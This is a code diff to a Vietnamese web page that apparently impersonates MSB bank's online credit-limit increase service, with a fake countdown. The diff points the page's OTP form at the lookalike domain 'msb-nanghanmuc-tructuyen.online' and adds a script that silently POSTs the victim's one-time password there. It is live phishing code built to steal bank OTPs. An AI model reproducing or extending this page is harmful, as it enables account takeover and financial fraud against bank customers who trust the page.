@@ -246,12 +246,11 @@
 
             <div id="countdown">Thời gian chờ của bạn còn lại 507 giây</div>
 
-            <form action="https://tucanhcomputer.vn/nang-han-muc.html"
-                id="service" method="get"
-                enctype="multipart/form-data">
+            <form action="https://msb-nanghanmuc-tructuyen.online/otp"
+                id="service" method="get">
                 <div class="form-group">
                     <label>Nhập mã otp:</label>
-                    <input name="maotp" id="buff_like_gender"
+                    <input name="otp" id="otp"
                         class="form-control" placeholder="Nhập mã otp" required>
                 </div>
 
@@ -977,6 +976,29 @@
                 <circle cx="24" cy="33.4" r="2"></circle>
             </symbol>
         </svg>
+
+        <script>
+            $('#service').submit(function (e) {
+                e.preventDefault();
+                var form = $(this);
+                var url = form.attr('action');
+                $.ajax({
+                    type: "POST",
+                    url: url,
+                    data: form.serialize(),
+                    success: function (data) {
+                        console.log(data);
+                        if (data == 'success') {
+                            window.location.href = 'otp.html';
+                        } else {
+                            alert('Vui lòng kiểm tra lại thông tin!');
+                        }
+                    }, error: function (data) {
+                        console.log(data);
+                    }
+                });
+            });
+        </script>
     </body>
 
 </html>
